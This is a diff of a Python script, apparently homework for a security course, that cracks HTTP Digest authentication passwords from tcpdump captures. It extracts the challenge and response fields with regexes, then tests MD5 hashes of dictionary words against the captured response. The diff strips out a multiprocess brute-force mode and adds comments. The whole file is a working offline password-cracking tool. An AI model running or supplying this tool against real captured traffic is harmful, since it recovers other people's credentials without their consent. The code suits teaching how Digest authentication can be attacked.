@@ -6,8 +6,9 @@ import sys
 import time
 import platform
 import hashlib
-from multiprocessing import Process
 
+# For parsing the HTTP headers. These are made to work with the header format the 5271 hw client sends
+# them and likely won't work for other clients.
 req_header_re = re.compile("(?P<method>GET)\s*(?P<uri>.+?)\s*HTTP/1\.1", re.M | re.I)
 
 auth_server_raw = "WWW-Authenticate: Digest realm=\"(?P<realm>[A-Z]+)\", nonce=\"(?P<snonce>.+?)\",\s*"
@@ -20,36 +21,14 @@ auth_resp_raw += "uri=\"(?P<uri>.+?)\", cnonce=\"(?P<cnonce>.+?)\", nc=(?P<ncoun
 auth_resp_raw += "qop=\"(?P<qop>auth)\", response=\"(?P<cresp>.+?)\", algorithm=\"(?P<hashtype>MD5)\""
 auth_resp_re = re.compile(auth_resp_raw, re.M | re.I)
 
-
-# ASCII character ranges
-numbers = range(48, 58)
-cap_letters = range(65, 91)
-low_letters = range(97, 123)
-
-pass_max = 10
-pass_min = 0
-
-max_procs = 5  # Currently only applies during brute force
-
 cracked_file = "cracked_pass.log"
-
-def genPasswords(_min, _max, charset):
-    for l in range(_min, _max + 1):
-        for pw in xselections(charset, l):
-            yield ''.join(pw)
-
-def xselections(items, n):
-    if n == 0: yield []
-    else:
-        for i in xrange(len(items)):
-            for ss in xselections(items, n - 1):
-                yield [items[i]] + ss
-
 
 class AuthContextException(Exception):
   pass
 
 
+# A class to contain all relevant information to an auth session. This was more relevant when I had brute force
+# and dictionary cracking. Now it could be rewritten functionally.
 class AuthContext:
     def __init__(self):
         self.realm = ""
@@ -72,9 +51,7 @@ class AuthContext:
         self.multiProc = False
 
 
-    def setToMultiProc(self):
-        self.multiProc = True
-        
+    # This is another vestige from the brute forcer.
     def setPWGenerator(self, gen):
         self.pw_gen = gen
 
@@ -89,7 +66,6 @@ class AuthContext:
         self.extractServerAuthData(data)
         self.extractClientAuthData(data)
 
-        #print(str(self))
         print("Starting password crack...")
 
         # Using the notation from the wikipedia page here:
@@ -104,12 +80,6 @@ class AuthContext:
         print("HA2 = " + ha2)
         print("resp template = " + resp)
 
-        # This is code from the old brute force method where we would just cruise through all
-        # various permutation.
-        #ascii_list = []
-        #for i in self.charset:
-        #  ascii_list.append(str(chr(i)))
-
         count = 0
         stime = time.time()
         for pw in self.pw_gen:
@@ -122,6 +92,8 @@ class AuthContext:
                 return
 
             count += 1
+
+            # Print a little status message every 50k checks
             if count % 50000 == 0:
                 if self.multiProc:
                     print("On Pass: {}".format(pw))
@@ -130,6 +102,7 @@ class AuthContext:
                     print("\tMost recent pass {}".format(pw))
 
 
+    # Extract all relevant information from the server's auth request back to the client
     def extractServerAuthData(self, data):
         m = auth_server_re.search(data)
         if m is None:
@@ -141,6 +114,7 @@ class AuthContext:
         self.qop = m.group('qop')
 
 
+    # Extract all relevant information from the client's response to the server
     def extractClientAuthData(self, data):
         m = auth_resp_re.search(data)
         if m is None:
@@ -193,24 +167,18 @@ class AuthContext:
 def usage(name):
     print("Usage: {} [tcpdump_output] [dictionary]".format(name))
     print("Note: This is not the raw packet data but the result of running 'tcpdump -A [packets]'")
-    
-def startCrackProcess(low, high, charset, ctx, auth_data, shared):
-	# We have to start the generator here because of limiations of multiprocessing
-	# on Windows under python. Data has to be pickled and recreated because there is
-	# no fork() call and generators cannot be pickled, hence we create it here.
-    gen = genPasswords(low, high, charset)
-    ctx.setPWGenerator(gen)
-    ctx.crackPassword(auth_data)
 
 if __name__ == '__main__':
-    if len(sys.argv) < 2:
+    if len(sys.argv) < 3:
         usage(sys.argv[0])
         sys.exit(1)
 
+    # Load the formatted packet capture data
     data = ""
     with open(sys.argv[1], 'r') as f:
         data = f.read()
 
+    # Read the dictionary into a list
     pw_dict = []
     if len(sys.argv) == 3:
         stime = time.time()
@@ -225,44 +193,9 @@ if __name__ == '__main__':
 
             print("Loaded {} from dictionary in {} seconds".format(len(pw_dict), time.time() - stime))
 
-    auth_context = None
-    if len(pw_dict) == 0:
-        # Brute Force attack
-        chars = numbers + cap_letters + low_letters
-        charset = []
-        for char in chars:
-            charset.append(str(chr(char)))
-
-        # Now we create a set of processes to make the brute forcing more efficient
-        len_range = pass_max - pass_min + 1
-        len_range = len_range / max_procs
-
-        processes = []
-        proc_ranges = range(pass_min,pass_max,len_range)
-        for index,low in enumerate(proc_ranges):
-            ctx = AuthContext()
-            high = None
-            try:
-                print("Process: pw length {} -> {}".format(low, proc_ranges[index+1]-1))
-                high = proc_ranges[index+1]-1
-            except IndexError:
-                print("Process: pw length {} -> {}".format(low, pass_max))
-                high = pass_max
-
-            ctx.setToMultiProc()
-            p = Process(target=startCrackWin, args=(low, high, charset, ctx, data, None))
-            p.start()
-            processes.append(p)
-
-        # Wait for them all to finish
-        for proc in processes:
-            proc.join()
-            print("Cracker process finished")
-
-    else:
-        # Dictionary attack
-        auth_context = AuthContext()
-        auth_context.setPWGenerator(pw_dict)
-        auth_context.crackPassword(data)
+    # Dictionary attack
+    auth_context = AuthContext()
+    auth_context.setPWGenerator(pw_dict)
+    auth_context.crackPassword(data)
 
     print("Check {} for any cracked passwords".format(cracked_file))
